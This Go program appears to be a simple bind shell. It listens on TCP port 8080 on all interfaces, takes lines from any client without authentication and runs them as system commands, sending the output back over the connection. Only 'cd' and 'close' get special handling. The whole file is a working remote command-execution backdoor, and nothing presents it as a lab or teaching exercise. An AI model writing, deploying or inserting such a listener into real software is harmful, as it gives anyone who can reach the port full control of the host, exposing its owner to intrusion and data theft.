package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"strings"
)

func main() {
	tcp_config := net.TCPAddr{IP: net.IPv4(0, 0, 0, 0), Port: 8080}
	listener, err := net.ListenTCP("tcp", &tcp_config)
	if err != nil {
		log.Fatal(err)
	}
	for {
		conn, err := listener.AcceptTCP()
		if err != nil {
			log.Fatal(err)
			continue
		}
		go HandleConn(conn)
	}
}

func HandleConn(conn net.Conn) {
	log.Print("Connected")
	defer conn.Close()
	for {
		b := make([]byte, 1024)
		n, err := conn.Read(b)
		if err != nil {
			log.Print("Disconnected")
			return
		}
		command := string(b[:n-1])
		runCommand(command, conn)

	}
}

func runCommand(cmd string, conn net.Conn) {
	// Split command and arguments
	command := strings.Split(cmd, " ")

	// Skip empty line
	if command[0] == "" {
		return
	}

	// Change directory
	if command[0] == "cd" {
		os.Chdir(command[1])
		conn.Write([]byte("Switched dir to " + command[1] + "\n"))
		return
	}

	// Close connection
	if command[0] == "close" {
		conn.Close()
		return
	}

	// Run other shell commands
	res := exec.Command(command[0], command[1:]...)
	stdout, err := res.Output()
	if err != nil {
		conn.Write([]byte(err.Error()))
		fmt.Println(err)
	}
	conn.Write(stdout)
}
